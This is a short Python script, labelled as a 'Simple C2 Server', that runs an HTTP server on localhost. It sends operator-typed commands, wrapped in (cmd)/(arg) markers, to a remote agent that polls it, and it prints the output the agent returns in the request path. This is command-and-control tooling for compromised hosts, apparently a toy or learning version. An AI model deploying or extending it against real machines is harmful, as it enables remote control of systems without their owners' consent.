#!/usr/bin/env python3
 
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

# HTTPRequestHandler class
class testHTTPServer_RequestHandler(BaseHTTPRequestHandler):
 
  # GET
  def do_GET(self):
        if self.path != "/":
            output = urllib.parse.unquote(self.path)
            print("Agent Returned: " + output)

        # Supply next command
        cmd = input("Command > ")

        cmd_list = cmd.split(" ",1)

        cmd = "(cmd)" + str(cmd_list[0]) + "(cmd)"

        if len(cmd_list) > 1:
            arg = "(arg)" + str(cmd_list[1]) + "(arg)"
            cmd = cmd + arg

        print(cmd)

        # Send response status code
        self.send_response(200)
 
        # Send headers
        self.send_header('Content-type','text/html')
        self.end_headers()
 
        # Write content as utf-8 data
        self.wfile.write(bytes(cmd, "utf8"))
 
        return
 
def run():
  print('Starting Simple C2 Server :)')

  # Server settings
  # Choose port 8080, for port 80, which is normally used for a http server, you need root access
  server_address = ('127.0.0.1', 8080)
  httpd = HTTPServer(server_address, testHTTPServer_RequestHandler)
  print('Sever initialized')
  httpd.serve_forever()


 
 
run()


